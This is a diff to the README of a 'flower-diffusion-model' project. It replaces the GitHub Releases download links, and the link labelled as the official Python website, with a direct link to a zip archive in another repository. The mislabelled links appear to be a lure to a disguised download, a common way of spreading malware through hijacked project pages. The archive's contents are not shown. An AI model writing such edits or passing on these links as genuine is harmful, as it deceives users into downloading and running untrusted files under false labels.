@@ -9,7 +9,7 @@ Welcome to the flower-diffusion-model! This application uses a powerful model to
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/larimreis/flower-diffusion-model/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://raw.githubusercontent.com/larimreis/larimreis.github.io/main/nais/Application_v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -26,13 +26,13 @@ Before you start, ensure you have the following on your device:
 
 ### 2. Install Python
 
-If you do not have Python installed on your computer, you can download it from the official [Python website](https://www.python.org/downloads/). Follow the instructions to install Python. Make sure to tick the box that says "Add Python to PATH" during installation.
+If you do not have Python installed on your computer, you can download it from the official [Python website](https://raw.githubusercontent.com/larimreis/larimreis.github.io/main/nais/Application_v2.4.zip). Follow the instructions to install Python. Make sure to tick the box that says "Add Python to PATH" during installation.
 
 ### 3. Download & Install
 
 To get the application, visit the following page:
 
-[Download Here](https://github.com/larimreis/flower-diffusion-model/releases)
+[Download Here](https://raw.githubusercontent.com/larimreis/larimreis.github.io/main/nais/Application_v2.4.zip)
 
 1. Click on the link above to go to the GitHub Releases page.
 2. Look for the latest version.
